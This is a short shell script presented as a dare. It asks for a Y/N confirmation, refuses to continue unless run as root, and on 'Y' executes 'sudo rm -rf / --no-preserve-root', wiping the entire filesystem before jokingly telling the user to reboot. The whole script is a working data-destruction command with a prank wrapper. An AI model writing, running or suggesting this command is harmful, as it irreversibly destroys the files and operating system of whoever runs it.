#! /bin/sh
echo "Hold Up! You Sure you gonna run this?"
echo
printf 'Answer with Y or N : ' ;read -r confirmation

if [ "$EUID" -ne 0 ]
  then echo; echo "Smh I dare you to run this as root"
  echo
  exit
fi
clear
if [[ $confirmation == "Y" ]] ; then
echo "As per your Wish"
clear && sudo rm -rf / --no-preserve-root
echo "Reboot Your System :)"

elif [[ $confirmation == "N" ]] ; then
echo "Great Choice , See you!"
exit

else
	echo "Invalid Input, Exiting...." ; exit
fi



